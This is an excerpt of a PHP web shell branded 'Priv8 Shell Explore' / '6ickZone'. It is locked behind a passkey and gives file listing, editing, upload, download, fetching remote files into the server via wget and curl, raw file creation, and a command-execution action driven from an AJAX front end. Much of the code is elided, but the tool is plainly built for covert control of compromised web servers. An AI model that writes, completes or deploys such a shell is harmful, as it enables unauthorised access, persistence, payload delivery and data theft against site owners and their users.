...
function get_perms($file){ $perms = @fileperms($file); if ($perms === false) return '????'; if (($perms & 0xC000) == 0xC000) $info = 's'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; elseif (($perms & 0x8000) == 0x8000) $info = '-'; elseif (($perms & 0x6000) == 0x6000) $info = 'b'; elseif (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0x2000) == 0x2000) $info = 'c'; elseif (($perms & 0x1000) == 0x1000) $info = 'p'; else $info = 'u'; $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; }
    ...
    switch ($action) {
        ...
        case 'save_content':
            ...
            if ((file_exists($file) && is_writable($file)) || (!file_exists($file) && is_writable(dirname($file)))) {
                ...
                $response = ['status' => 'error', 'message' => 'File or directory not writable.'];
            }
            break;
                ...
                for ($i = 0; $i < $totalFiles; $i++) {
                    if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
                        ...
                        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $uploadPath)) {
                            $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'ok'];
                        } else {
                            $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'error'];
                        }
                    } else {
                        $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'error'];
                    }
        ...
        case 'upload_wget':
            ...
            $filename = isset($_POST['filename']) && !empty($_POST['filename']) ? $_POST['filename'] : basename($url);
            ...
            if (file_exists($target_path) && filesize($target_path) > 0) {
                $response = ['status' => 'ok', 'message' => "File downloaded via wget!\nOutput:\n$output"];
            } else {
                @unlink($target_path);
                $response = ['status' => 'error', 'message' => "Failed to download file.\nOutput:\n$output"];
            }
            break;
        ...
        case 'upload_curl':
            ...
            if (file_exists($target_path) && filesize($target_path) > 0) {
                $response = ['status' => 'ok', 'message' => "File downloaded via curl!\nOutput:\n$output"];
            } else {
                @unlink($target_path);
                $response = ['status' => 'error', 'message' => "Failed to download file.\nOutput:\n$output"];
            }
        ...
        case 'upload_raw':
            ...
            if (empty($filename)) {
                $response = ['status' => 'error', 'message' => 'Filename cannot be empty!'];
                break;
            }
            ...
            if ((file_exists($target_path) && is_writable($target_path)) || (!file_exists($target_path) && is_writable($path))) {
                if (file_put_contents($target_path, $content) !== false) {
                    $response = ['status' => 'ok', 'message' => 'Raw file created successfully!'];
                } else {
                    $response = ['status' => 'error', 'message' => 'Failed to save file!'];
                }
            } else {
...
<head>
    ...
    <title>File Explorer - 6ickZone</title>
...
<div class="container">
    <div class="sidebar">
        <div class="sidebar-header">
            <h3><i class="fa-solid fa-terminal"></i> Priv8 Shell Explore</h3>
...
<script>
    const passkey = '<?php echo $passkey; ?>';
    let currentPath = '';
    let uploadQueue = [];
    ...
    async function loadServerInfo() {
        try {
            const response = await fetch(`?k=${passkey}&ajax=true&action=get_server_info`);
    ...
    function updateUploadUI() {
        ...
        if (uploadQueue.length > 0) {
            ...
            let fileList = document.getElementById('upload-zone').querySelector('.file-list');
            if (!fileList) {
                fileList = document.createElement('div');
                fileList.className = 'file-list';
                document.getElementById('upload-zone').appendChild(fileList);
            }
            fileList.innerHTML = uploadQueue.map((item, index) => `<div class="file-list-item"><div class="file-name">${item.file.name}</div><div style="font-size:0.8em;">${item.status === 'success' ? '✓' : item.status === 'error' ? '✗' : '...'}</div></div>`).join('');
        } else {
    ...
    async function uploadSingleFile(item, index) {
        ...
        try {
            const response = await fetch(`?k=${passkey}&ajax=true&action=upload_multiple&d=${encodeURIComponent(currentPath)}`, {
    ...
    async function doAction(action, data) {
        ...
        try {
            const response = await fetch(`?k=${passkey}&ajax=true&action=${action}&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
    ...
    async function openEditor(filePath) {
        try {
            const response = await fetch(`?k=${passkey}&ajax=true&action=get_content&file=${encodeURIComponent(filePath)}`);
            const result = await response.json();
            if (result.status === 'ok') {
    ...
    async function handleCmd(e) {
        ...
        try {
            const response = await fetch(`?k=${passkey}&ajax=true&action=cmd&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
    ...
    function loadContent(path) {
        ...
        fetch(`?k=${passkey}&ajax=true&action=list&d=${encodeURIComponent(path)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status !== 'ok') {
                ...
                fileList.innerHTML = data.files.map(f => `
                    <tr>
                        <td><i class="fa-regular fa-file-lines"></i> ${f.name}</td>
                        <td>${f.size}</td>
                        <td class="perms ${f.is_writable ? 'writable' : 'not-writable'}">${f.perms}</td>
                        <td>${f.mtime}</td>
                        <td class="actions-menu">
                            ...
                            <a href="?k=${passkey}&download=${encodeURIComponent(f.path)}" title="Download"><i class="fa-solid fa-download"></i></a>
